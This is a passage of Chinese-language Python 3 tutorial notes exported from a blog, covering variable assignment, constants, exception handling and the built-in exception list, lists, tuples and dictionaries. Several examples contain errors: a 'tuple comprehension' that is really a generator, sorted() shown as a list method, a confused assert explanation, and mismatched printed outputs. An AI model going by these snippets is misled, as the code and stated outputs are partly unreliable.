<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>age</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;age&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>age = <span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>age</span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>



<h2 id="赋值的方式"><a href="#赋值的方式" class="headerlink" title="赋值的方式"></a>赋值的方式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接赋值</span></span><br><span class="line">age = <span class="number">20</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量赋值</span></span><br><span class="line"> a = b = c = <span class="number">1</span> </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 赋值运算记结果</span></span><br><span class="line">age = <span class="number">10</span> + <span class="number">2</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别赋值</span></span><br><span class="line">a,b,c = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>



<h2 id="对象存储过程"><a href="#对象存储过程" class="headerlink" title="对象存储过程"></a>对象存储过程</h2><p>当我输入<code>a = &#39;xxx&#39;</code>时</p>
<p>在内存中创建 一个<code>&#39;xxx&#39;</code>字符串的对象</p>
<p>在内存中创建了一个命名为a的变量，并指向Python</p>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量就是不变的变量，比如圆周率就是一个常量</p>
<p>在怕Python中，通常用全部大写的变量名表示常量</p>
<p>事实上，常量仍然是一个变量，因为没有任何保护机制保证常量不会被修改</p>
<p>用全部大写的方法来表示常量只是优化语义</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3基础</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-异常</title>
    <url>//fc7cf6eade53.html</url>
    <content><![CDATA[<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>程序运行过程当中，不可避免的会出现一些错误</p>
<p>这些错误在过程中，我们称之为异常</p>
<h2 id="处理异常"><a href="#处理异常" class="headerlink" title="处理异常"></a>处理异常</h2><p>程序运行时出现异常，目的并不是让我们的程序直接终止<br>我们可以在出现异常时，编写代码对异常进行处理<br>避免因为一个异常导致程序的终止</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> 语句</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		代码块（可能出现错误的语句）</span><br><span class="line">	<span class="comment"># 如果except后不跟任何内容，会捕获所有的异常</span></span><br><span class="line">	<span class="comment"># 如果跟着异常的类型，只会捕获相关异常</span></span><br><span class="line">	<span class="comment"># 如果既想捕获所有异常，又想捕获某一异常，可以写多个except语句</span></span><br><span class="line">	<span class="comment"># Exception 是所有异常的父类，如果except后跟的是Exception，他也会捕获到所有的异常</span></span><br><span class="line">	<span class="keyword">except</span> 异常类型 <span class="keyword">as</span> 异常名:</span><br><span class="line">		代码块（出现错误以后的处理方式）</span><br><span class="line">	<span class="keyword">except</span> 异常类型 <span class="keyword">as</span> 异常名:</span><br><span class="line">		代码块（出现错误以后的处理方式）</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		代码块（没出现错误时执行的语句）</span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		代码块（无论是否有异常，该代码总会执行）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把异常用as的方式赋值给变量</span></span><br><span class="line"><span class="keyword">except</span> 异常 <span class="keyword">as</span> x</span><br></pre></td></tr></table></figure>



<h2 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h2><p>如果在函数中对异常进行处理，异常便不会影响程序<br>如果不对函数的异常进行处理，异常会传递到函数的调用处<br>出现异常后，所有异常信息会保存在一个专门保存异常的对象中<br>异常传播时，会调用这个保存异常的对象<br>比如 ：<br>    ZeroDivisionError类的对象专门用来表示除0的异常<br>    NameError类的对象专门用来处理变量错误的异常</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">可以使用 <span class="keyword">raise</span> 语句来抛出异常</span><br><span class="line"><span class="comment"># raise用于向外部抛出异常，后边可以跟一个异常类，或异常类的实例</span></span><br><span class="line"><span class="comment"># raise Exception</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">	<span class="keyword">if</span> a &lt; <span class="number">0</span> <span class="keyword">or</span> b &lt; <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">raise</span> Exception(<span class="string">&#x27;两个参数中不能有负数&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> a+b</span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">123</span>,<span class="number">456</span>))</span><br><span class="line"><span class="comment"># 也可以自定义异常类，只需要创建一个类继承Exception即可</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>一般用于对程序某个时刻必须满足的条件进行验证</p>
<p>因为<code>assert</code>条件为<code>False</code>才会执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">	<span class="keyword">assert</span> a &lt; <span class="number">0</span> <span class="keyword">and</span> b &lt; <span class="number">0</span>,<span class="string">&quot;两个参数中不能有负数&quot;</span> </span><br><span class="line">	<span class="keyword">return</span> a+b</span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">123</span>,<span class="number">456</span>))</span><br><span class="line"><span class="comment"># 这里or是找True，所以不合适，应该使用and，找False</span></span><br><span class="line"><span class="comment"># a &lt; 0为True,所以不抛出异常,b&lt;0为False，所以抛出异常</span></span><br><span class="line">可以写成</span><br><span class="line"><span class="keyword">assert</span> a &gt; <span class="number">0</span> <span class="keyword">and</span> b &gt; <span class="number">0</span>,<span class="string">&quot;两个参数中不能有负数&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以用try语句控制</span></span><br><span class="line">a = -<span class="number">123</span></span><br><span class="line">b = <span class="number">456</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    add(a,b)</span><br><span class="line"><span class="keyword">except</span> AssertionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入有误：&quot;</span>, e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(add(a,b))</span><br></pre></td></tr></table></figure>



<h2 id="内置异常"><a href="#内置异常" class="headerlink" title="内置异常"></a>内置异常</h2><ul>
<li>Exception：所有异常的父类<ul>
<li>SystemExit：解释器请求退出</li>
<li>KeyboardInterrupt：用户中断执行</li>
<li>GeneratorExit：生成器发生异常来通知退出</li>
<li>Exception：常规错误的父类<ul>
<li>StopIteration：迭代器没有更多的值</li>
<li>StopAsyncIteration：必须通过异步迭代器对象的__anext__()方法引发以停止迭代</li>
<li>ArithmeticError：所有数值计算错误的基类<ul>
<li>FloatingPointError：浮点数计算错误</li>
<li>OverflowError：数值运算超出最大限制</li>
<li>ZeroDivisionError：除(或取模)零所有数据类型</li>
</ul>
</li>
<li>AssertionError：当<code>assert</code>语句判定<code>False</code>，断言失败</li>
<li>AttributeError：对象中没有这个属性</li>
<li>BufferError：与缓冲区相关的操作引发</li>
<li>EOFError：没有内建输入，到达EOF标记</li>
<li>ImportError：导入模块失败<ul>
<li>ModuleNotFoundError：找不到模块</li>
</ul>
</li>
<li>LookupError：无效数据查询<ul>
<li>IndexError：序列中没有此索引</li>
<li>KeyError：映射中没有这个键</li>
</ul>
</li>
<li>MemoryError：内存溢出错误</li>
<li>NameError：未声明，初始化对象<ul>
<li>UnboundLocalError：访问未初始化的本地变量</li>
</ul>
</li>
<li>OSError：操作系统错误<ul>
<li>BlockingIOError：操作将阻塞对象设置为非阻塞操作</li>
<li>ChildProcessError：子进程上的操作失败</li>
<li>ConnectionError：与链接相关的异常<ul>
<li>BrokenPipeError：在关闭写入的套接字上写入</li>
<li>ConnectionAbortedError：链接被对方终止</li>
<li>ConnectionRefusedError：链接被对方拒绝</li>
<li>ConnectionResetError：链接被对方重置</li>
</ul>
</li>
<li>FileExistsError：创建已存在的文件或者目录</li>
<li>FileNotFoundError：请求文件或者目录不存在</li>
<li>InterruptedError：系统调用被输入信号中断</li>
<li>IsADirectoryError：在目录上请求文件</li>
<li>NotADirectoryError：在不是目录事物上请求目录操作</li>
<li>PermissionError：没有访问权限</li>
<li>ProcessLookupError：进程不存在</li>
<li>TimeoutError：系统函数在系统级别超时</li>
</ul>
</li>
<li>ReferenceError：弱引用试图访问已经垃圾回收了的对象</li>
<li>RuntimeError：一般的运行时错误<ul>
<li>NotImplementedError：尚未实现的方法</li>
<li>RecursionError：解释器检测到超出最大递归深度</li>
</ul>
</li>
<li>SyntaxError：Python语法错误<ul>
<li>IndentationError：缩进错误<ul>
<li>TabError：Tab和空格混用</li>
</ul>
</li>
</ul>
</li>
<li>SystemError：系统错误</li>
<li>TypeError：类型错误</li>
<li>ValueError：传入无效的参数<ul>
<li>UnicodeError：Unicode 相关的错误<ul>
<li>UnicodeDecodeError：Unicode 解码时的错误</li>
<li>UnicodeEncodeError：Unicode 编码时错误</li>
<li>UnicodeTranslateError：Unicode 转换时错误</li>
</ul>
</li>
</ul>
</li>
<li>Warning：警告的错误<ul>
<li>DeprecationWarning：关于被弃用的特征的警告</li>
<li>PendingDeprecationWarning：关于构造将来语义会有改变的警告</li>
<li>RuntimeWarning：可疑的运行行为的警告</li>
<li>SyntaxWarning：可疑的语法的警告</li>
<li>UserWarning：用户代码生成的警告</li>
<li>FutureWarning：有关已弃用功能的警告的基类</li>
<li>ImportWarning：模块导入时可能出错的警告的基类</li>
<li>UnicodeWarning：与Unicode相关的警告的基类</li>
<li>BytesWarning：bytes和bytearray相关的警告的基类</li>
<li>ResourceWarning：与资源使用相关的警告的基类</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3基础</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-数组</title>
    <url>//ecee3d177b80.html</url>
    <content><![CDATA[<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
<li>列表(list): 是序列中的可变序列</li>
<li>元组(tuple): 是序列中的不可变序列</li>
<li>字典(dict): 新的数据结构，称为映射（mapping）</li>
<li>集合(set): 是一个无序和无索引的集合。没有重复的成员</li>
</ul>
<h2 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h2><p>​    序列是一块用于存放多个值的连续内存空间，并且按一定顺序排列，每个值（称为元素）都分配一个数字，称为索引或位置。通过该索引可以取出相应的值。</p>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>Python中的列表是由一系列按特定顺序排列的元素组成。它是Python中内置的可变序列。</p>
<p>在形式上，列表的所有元素都放在一对中括号“[]”中，两个相邻元素间使用逗号“,”分隔。</p>
<p>在内容上，可以将整数、实数、字符串、列表、元组等任何类型的内容放入列表中，并且同一个列表中，元素的类型可以不同，因为它们之间没有任何关系。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	列表名字 = [a,b,c]</span><br><span class="line">a,b,c是元素，可以是任意的数值类型</span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">type</span>(a) = <span class="built_in">list</span></span><br></pre></td></tr></table></figure>



<h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>序列中的每个元素都有一个编号，也称为索引（Indexing）。这个索引是从0开始递增的，即下标为0表示第一个元素，下标为1表示第二个元素，依此类推。</p>
<p>Python的索引可以是负数。这个索引从右向左计数，也就是从最后的一个元素开始计数，即最后一个元素的索引值是−1，倒数第二个元素的索引值为−2，依此类推。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>])</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(a[-<span class="number">1</span>])</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>



<h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><p>获取多个索引称为切片</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	列表名字[起始索引:结束索引:步长]</span><br><span class="line">步长默认为<span class="number">1</span>，起始位置(包括)和结束位置(不包括)也可省略不写</span><br><span class="line">三者都写成负数，则从列表的后向前取a[-<span class="number">1</span>:-<span class="built_in">len</span>(a)-<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line">[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">5</span>:<span class="number">2</span>])</span><br><span class="line">[<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(a[:])</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br></pre></td></tr></table></figure>



<h3 id="修改列表"><a href="#修改列表" class="headerlink" title="修改列表"></a>修改列表</h3><p>可以用切片修改列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">对象名[起始索引:结束索引:步长] = [元素<span class="number">1</span>,元素<span class="number">2.</span>.....]</span><br><span class="line">a[<span class="built_in">len</span>(a):]=[<span class="number">11</span>]	结尾增加</span><br><span class="line">a[<span class="number">0</span>:<span class="number">0</span>]=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] 固定位置或者开头增加</span><br><span class="line">a[<span class="number">0</span>:<span class="number">3</span>] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] 修改前三个</span><br></pre></td></tr></table></figure>



<h3 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h3><p>通过for循环遍历列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">for</span> 变量 <span class="keyword">in</span> 序列 :</span><br><span class="line">	代码块</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">通过<span class="keyword">for</span>循环和<span class="built_in">enumerate</span>()函数遍历列表和索引</span><br><span class="line"><span class="keyword">for</span> 变量<span class="number">1</span>,变量<span class="number">2</span> <span class="keyword">in</span> <span class="built_in">enumerate</span>(序列名字):</span><br><span class="line">	代码块</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(a):</span><br><span class="line">	<span class="built_in">print</span>(i,x)</span><br></pre></td></tr></table></figure>



<h3 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = [表达式 for 变量 in 序列]</span><br><span class="line">import random</span><br><span class="line">a = [random.randint(1,100) for i in range(10)]</span><br><span class="line">从1-100里面随机生成10个数字</span><br><span class="line"></span><br><span class="line">name = [表达式 for 变量 in 序列 条件语句]</span><br><span class="line">a = [1,2,3,4,5,6]</span><br><span class="line">b = [i+1 for i in a if i&gt;0]</span><br><span class="line">print(b)</span><br><span class="line">[2,3,4,5,6,7]</span><br></pre></td></tr></table></figure>



<h3 id="方法-method"><a href="#方法-method" class="headerlink" title="方法(method)"></a>方法(method)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line">append()方法:添加元素</span><br><span class="line">对象名.append(新元素)</span><br><span class="line"></span><br><span class="line">index()方法:返回具有指定值的第一个元素的索引</span><br><span class="line">print(对象名.index(元素,起始索引,结束索引))	#起始和结束位置可以省略</span><br><span class="line"></span><br><span class="line">count()方法:统计指定元素出现的次数</span><br><span class="line">对象名.count(元素)</span><br><span class="line"></span><br><span class="line">insert()方法:按指定位置添加元素</span><br><span class="line">对象名.insert(索引,新元素)</span><br><span class="line"></span><br><span class="line">remove()方法:删除指定元素，有多个相同元素只会删除第一个</span><br><span class="line">对象名.remove(元素)</span><br><span class="line"></span><br><span class="line">pop()方法:删除指定索引，如未指定索引，默认删除最后一个</span><br><span class="line">对象名.pop(索引)</span><br><span class="line"></span><br><span class="line">del 方法:删除列表</span><br><span class="line">del 列表名    #也可以用 del 列表名[索引] 来删除指定索引</span><br><span class="line"></span><br><span class="line">clear()方法:清空列表</span><br><span class="line">对象名.clear()</span><br><span class="line"></span><br><span class="line">copy()方法:复制列表</span><br><span class="line">变量 = 对象名.copy()</span><br><span class="line"></span><br><span class="line">list()方法:复制列表	#也可以使用此函数把其他序列转换为列表</span><br><span class="line">变量 = list(对象名)</span><br><span class="line"></span><br><span class="line">extend()方法:合并列表</span><br><span class="line">对象1.extend(对象2/元素)</span><br><span class="line"></span><br><span class="line">reverse()方法:颠倒列表顺序</span><br><span class="line">对象名.reverse()</span><br><span class="line"></span><br><span class="line">sort()方法:对列表排序</span><br><span class="line">对象名.sort()				#默认为升序</span><br><span class="line">对象名.sort(reverse=True)	#降序</span><br><span class="line"></span><br><span class="line">sorted()方法:对列表排序</span><br><span class="line">对象名.sorted()				#默认为升序</span><br><span class="line">对象名.sorted(reverse=True)	#降序</span><br><span class="line">列表对象的sort()方法和内置sorted()函数的作用基本相同</span><br><span class="line">所不同的就是使用sort()方法时，会改变原列表的元素排列顺序</span><br><span class="line">但是使用sorted()函数时，会建立一个原列表的副本，该副本为排序后的列表</span><br></pre></td></tr></table></figure>



<h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>​        元组（tuple）是Python中另一个重要的序列结构，与列表类似，也是由一系列按特定顺序排列的元素组成。但是它是不可变序列。因此，元组也可以称为不可变的列表。</p>
<p>元组不能重新赋值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象名 = (元素<span class="number">1</span>,元素<span class="number">2.</span>.....)	</span><br><span class="line">当不是空元组时，括号可以省略，但必须有逗号，比如：对象名 = 元素<span class="number">1</span>,</span><br></pre></td></tr></table></figure>



<h3 id="解包（解构）"><a href="#解包（解构）" class="headerlink" title="解包（解构）"></a>解包（解构）</h3><p>解包指就是将元组当中每一个元素都赋值给一个变量<br>在对一个元组进行解包时，变量的数量必须和元组中的元素的数量一致<br>也可以在变量前边添加一个<code>*</code>，这样变量将会获取元组中所有剩余的元素<br>不能同时出现两个或以上的<code>*</code>变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a,b,c = 对象名</span><br><span class="line">a,b,*c = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>)</span><br></pre></td></tr></table></figure>



<h3 id="索引-1"><a href="#索引-1" class="headerlink" title="索引"></a>索引</h3><p>序列中的每个元素都有一个编号，也称为索引（Indexing）。这个索引是从0开始递增的，即下标为0表示第一个元素，下标为1表示第二个元素，依此类推。</p>
<p>Python的索引可以是负数。这个索引从右向左计数，也就是从最后的一个元素开始计数，即最后一个元素的索引值是−1，倒数第二个元素的索引值为−2，依此类推。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(-<span class="number">2</span>)</span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>



<h3 id="修改元组"><a href="#修改元组" class="headerlink" title="修改元组"></a>修改元组</h3><p>把元组转换为列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">y = <span class="built_in">list</span>(x)</span><br><span class="line">y[<span class="number">0</span>] = <span class="string">&quot;hello&quot;</span></span><br><span class="line">x = <span class="built_in">tuple</span>(y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line">(<span class="string">&quot;yello&quot;</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure>



<h3 id="遍历元组"><a href="#遍历元组" class="headerlink" title="遍历元组"></a>遍历元组</h3><p>通过for循环遍历列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">for</span> 变量 <span class="keyword">in</span> 序列 :</span><br><span class="line">	代码块</span><br><span class="line"></span><br><span class="line">a = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">通过<span class="keyword">for</span>循环和<span class="built_in">enumerate</span>()函数遍历元组和索引</span><br><span class="line"><span class="keyword">for</span> 变量<span class="number">1</span>,变量<span class="number">2</span> <span class="keyword">in</span> <span class="built_in">enumerate</span>(序列名字):</span><br><span class="line">	代码块</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(a):</span><br><span class="line">	<span class="built_in">print</span>(i,x)</span><br></pre></td></tr></table></figure>



<h3 id="元组推导式"><a href="#元组推导式" class="headerlink" title="元组推导式"></a>元组推导式</h3><p>和列表推导式一样，只是把<code>[]</code>变成<code>()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = (表达式 for 变量 in 序列)</span><br><span class="line">import random</span><br><span class="line">a = (random.randint(1,100) for i in range(10))</span><br><span class="line">从1-100里面随机生成10个数字</span><br><span class="line"></span><br><span class="line">name = (表达式 for 变量 in 序列 条件语句)</span><br><span class="line">a = (1,2,3,4,5,6)</span><br><span class="line">b = (i+1 for i in a if i&gt;0)</span><br><span class="line">print(b)</span><br><span class="line">(2,3,4,5,6,7)</span><br></pre></td></tr></table></figure>



<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line"><span class="built_in">tuple</span>(x)</span><br><span class="line">创建元组,把x的内容转换为元组,x多为表达式</span><br><span class="line"><span class="built_in">tuple</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> 变量</span><br><span class="line">对于已经创建的元组，不在使用时，可以使用<span class="keyword">del</span>删除</span><br><span class="line"></span><br><span class="line"><span class="built_in">len</span>(x)</span><br><span class="line">通过<span class="built_in">len</span>()函数确定元组的长度</span><br><span class="line"></span><br><span class="line">对象名.index(x)</span><br><span class="line">在元组中搜索x的值并返回它的索引位置</span><br><span class="line"></span><br><span class="line">对象名.count(x)</span><br><span class="line">返回元组中指定值x出现的次数</span><br></pre></td></tr></table></figure>



<h3 id="列表和元组的区别"><a href="#列表和元组的区别" class="headerlink" title="列表和元组的区别"></a>列表和元组的区别</h3><ul>
<li>列表属于可变序列，元素可以修改；元组属于不可变序列，元素不可以修改，除非整体替换。</li>
<li>列表可以使用很多方法添加和修改元素，而元组没有</li>
<li>列表可以使用切片访问和修改元素，而元组只可以通过切片访问元素</li>
<li>元组比列表的访问速度要快，如果不对元素进行修改的时候，建议使用元组</li>
<li>列表不能作为字典的键，而元组可以</li>
</ul>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>​        字典（dictionary）和列表类似，也是可变序列，不过与列表不同，它是无序的可变序列，保存的内容是以“键-值对”的形式存放的。</p>
<p>字典属于一种新的数据结构，称为映射（mapping）</p>
<p>字典，我们也称为叫做键值对（key-value）结构</p>
<p>每个字典中都可以有多个键值对，而每一个键值对我们称其为一项（item）</p>
<p>字典的key不能重复</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	变量 = &#123;key:value,key:value,key:value.......&#125;</span><br></pre></td></tr></table></figure>



<h3 id="创建字典"><a href="#创建字典" class="headerlink" title="创建字典"></a>创建字典</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line">这里不论是key还是value，只要是字符串，要加引号</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">dict</span>(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line">通过<span class="built_in">dict</span>函数创建字典，这里字符串不需要加引号</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">dict</span>([(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>),(<span class="string">&#x27;b&#x27;</span>,<span class="number">2</span>),(<span class="string">&#x27;c&#x27;</span>,<span class="number">3</span>)])</span><br><span class="line">双值序列创建字典</span><br></pre></td></tr></table></figure>



<h3 id="获取字典的值"><a href="#获取字典的值" class="headerlink" title="获取字典的值"></a>获取字典的值</h3><p>通过key获取字典的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">dict</span>(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line">a[<span class="string">&#x27;a&#x27;</span>]</span><br></pre></td></tr></table></figure>



<h3 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">dict</span>(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">通过遍历 keys()来获取所有的键</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 对象名.keys():</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a.keys():</span><br><span class="line">	<span class="built_in">print</span>(i,a[i])</span><br><span class="line">a <span class="number">1</span></span><br><span class="line">b <span class="number">2</span></span><br><span class="line">c <span class="number">3</span></span><br><span class="line"></span><br><span class="line">通过遍历 values()返回字典的值</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 对象名.keys():</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    </span><br><span class="line">通过遍历 items()该方法会返回字典中所有的项</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 对象名.items():</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> 对象名.items():</span><br><span class="line">	<span class="built_in">print</span>(k , <span class="string">&#x27;=&#x27;</span> , v)</span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br></pre></td></tr></table></figure>



